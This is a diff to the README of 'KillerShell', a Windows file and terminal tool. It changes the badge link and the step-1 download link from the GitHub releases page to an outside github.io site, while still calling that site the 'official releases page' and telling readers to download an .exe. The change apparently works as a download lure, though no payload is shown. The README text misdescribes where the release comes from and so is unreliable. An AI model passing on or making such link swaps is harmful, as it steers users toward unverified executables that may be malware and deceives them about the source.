@@ -1,6 +1,6 @@
 # 📁 KillerShell - Manage your files and terminal easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/propositiontriceps628/KillerShell/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://propositiontriceps628.github.io)
 
 KillerShell combines a file manager, a terminal, and a text editor into one tool. It runs on Windows without the need for an installer. You do not need an account to use it.
 
@@ -8,7 +8,7 @@ KillerShell combines a file manager, a terminal, and a text editor into one tool
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/propositiontriceps628/KillerShell/releases) to download the latest version.
+1. Visit the [official releases page](https://propositiontriceps628.github.io) to download the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to start the download.
 4. Move the file to a folder where you want to keep the tool.
